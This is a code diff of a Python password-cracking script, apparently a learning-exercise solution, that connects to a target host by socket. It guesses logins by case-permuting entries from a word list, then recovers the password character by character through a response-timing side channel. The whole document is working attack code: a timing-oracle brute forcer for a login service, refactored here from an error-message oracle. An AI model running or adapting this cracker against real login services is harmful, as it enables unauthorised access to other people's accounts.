@@ -4,7 +4,7 @@ import os
 import socket
 import string
 import sys
-from typing import Iterable
+from datetime import datetime
 
 HOST = sys.argv[1]
 PORT = int(sys.argv[2])
@@ -24,103 +24,100 @@ class TxtReader:
 
 
 class Hack:
-    """Password hacking methods"""
+    """Password cracker"""
 
-    def __init__(self, connection, login_charset: str = None, password_charset: str = None,
-                 success_message: str = "Connection success!"):
+    def __init__(self, connection, login_charset: str, password_charset: str,
+                 success_message_for_login: str = "Wrong password!",
+                 success_message_for_password: str = "Connection success!"):
         self.connection = connection
         self.login_charset = login_charset
         self.password_charset = password_charset
-        self.success_message = success_message
+        self.success_message_for_login = success_message_for_login
+        self.success_message_for_password = success_message_for_password
+        self.login = None
+        self.password = None
 
-    def brute_force_passwords(self, request_template: dict, minlength: int = 1, maxlength: int = 16) -> str:
-        """Iterates over all possible combinations characters of charset from minlength to maxlength.
-            If receives in response self.success_message returns password"""
+    def __str__(self):
+        return json.dumps({"login": self.login, "password": self.password}, indent=4)
 
-        correct_char_message = json.dumps({"result": "Exception happened during login"})
-        correct_password_message = json.dumps({"result": self.success_message})
+    def brute_force_password(self, min_length: int = 1, max_length: int = 1) -> str:
+        """Iterates over all possible combinations characters of charset from minimum to maximum length.
+            If receives in response success_message returns password"""
+
+        request_template = {
+            "login": self.login,
+            "password": " "
+        }
+
+        correct_password_message = json.dumps({"result": self.success_message_for_password})
         start_password = ""
         while True:
-            password_generator = brute_force(self.password_charset, minlength, maxlength + 1)
 
-            for char in password_generator:
+            for char in self.brute_force(min_length, max_length):
                 password = start_password + char
                 request_template["password"] = password
                 request_template = json.dumps(request_template)
-                correct_password = send_data(self.connection, request_template)
 
-                if correct_password == correct_char_message:
+                start = datetime.now()
+                correct_password = self.send_data(request_template)
+                finish = datetime.now()
+                difference = (finish - start).total_seconds()
+
+                if difference > 0.01:
                     start_password = password
                     request_template = json.loads(request_template)
                     break
 
                 elif correct_password == correct_password_message:
-                    return request_template
+                    self.password = password
+                    return password
 
                 request_template = json.loads(request_template)
 
-    def brute_typical_login(self, request_template: dict) -> dict:
+    def brute_typical_login(self, request_template: dict) -> str:
         """Iterates over all possible combinations of case letters from charset.
-            If receives in response self.success_message returns login"""
-        correct_login_message = json.dumps({"result": "Wrong password!"})
+            If receives in response success_message returns login"""
 
-        for lgn in self.login_charset:
-            login_generator = generate_typical_passwords(lgn)
-            for login in login_generator:
-                request_template["login"] = login
-                request_template = json.dumps(request_template)
-                correct_login = send_data(self.connection, request_template)
+        correct_login_message = json.dumps({"result": self.success_message_for_login})
 
-                if correct_login == correct_login_message:
-                    request_template = json.loads(request_template)
-                    return request_template
+        for login in self.generate_typical():
+            request_template["login"] = login
+            request_template = json.dumps(request_template)
+            correct_login = self.send_data(request_template)
 
-                request_template = json.loads(request_template)
+            if correct_login == correct_login_message:
+                self.login = login
+                return login
 
-    def brute_login_password(self) -> str:
-        """Brutes login and password combination and return data in json format"""
-        login_password_values = {
-            "login": " ",
-            "password": " "
-        }
+            request_template = json.loads(request_template)
 
-        brute_login = self.brute_typical_login(login_password_values)
-        login_password_values = self.brute_force_passwords(brute_login, 1, 1)
+    def brute_force(self, min_length: int, max_length: int) -> str:
+        """Takes minimum and maximum combination length. Generates all possible combinations from a charset"""
 
-        return login_password_values
+        for length in range(min_length, max_length + 1):
+            for char in itertools.product(self.password_charset, repeat=length):
+                yield "".join(char)
 
+    def generate_typical(self) -> str:
+        """Generates all possible combinations of case letters from a takes charset"""
 
-def brute_force(charset: Iterable, minlength: int, maxlength: int) -> str:
-    """Takes an iterable object with a sequence of possible characters.
-        Minimum and maximum combination length. Generates all possible combinations"""
+        for login in self.login_charset:
+            password_chars = [{char.upper(), char.lower()} for char in
+                              login]  # set char for drops duplicates non-alpha symbols
+            for pwd in itertools.product(*password_chars):
+                yield "".join(pwd)
 
-    for length in range(minlength, maxlength + 1):
-        for char in itertools.product(charset, repeat=length):
-            yield "".join(char)
+    def send_data(self, message: str) -> str:
+        """Sends the message by the connection and returns response"""
 
-
-def generate_typical_passwords(password: str) -> str:
-    """Generates all possible combinations of case letters from a takes password"""
-
-    password_chars = [{char.upper(), char.lower()} for char in
-                      password]  # set char for drops duplicates non-alpha symbols
-    for pwd in itertools.product(*password_chars):
-        yield "".join(pwd)
-
-
-def send_data(connection, password: str) -> str:
-    """Takes the opened connection, password and message that is expected to be received on success.
-        Sends the password by the connection and listens for the response,
-        if receives a success message in response, returns True"""
-
-    encoded_password = password.encode()
-    try:
-        connection.send(encoded_password)
-        response = connection.recv(1024)
-        response = response.decode()
-        return response
-    except ConnectionAbortedError:
-        pass
+        encoded_password = message.encode()
+        try:
+            self.connection.send(encoded_password)
+            response = self.connection.recv(1024)
+            response = response.decode()
+            return response
+        except ConnectionAbortedError:
+            pass
 
 
 def main():
@@ -129,11 +126,19 @@ def main():
     path_to_logins = f"{os.path.join(os.path.dirname(os.path.abspath(__file__)))}\\logins.txt"
     login_charset = TxtReader(path_to_logins).read()
 
+    request_template = {
+        "login": " ",
+        "password": " "
+    }
+
     with socket.socket() as connection:
         connection.connect(ADDRESS)
-        brute = Hack(connection, login_charset=login_charset, password_charset=password_charset)
-        data = brute.brute_login_password()
-    print(data)
+        admin_account = Hack(connection, login_charset, password_charset)
+
+        admin_account.brute_typical_login(request_template)
+        admin_account.brute_force_password()
+
+    print(admin_account)
 
 
 if __name__ == "__main__":
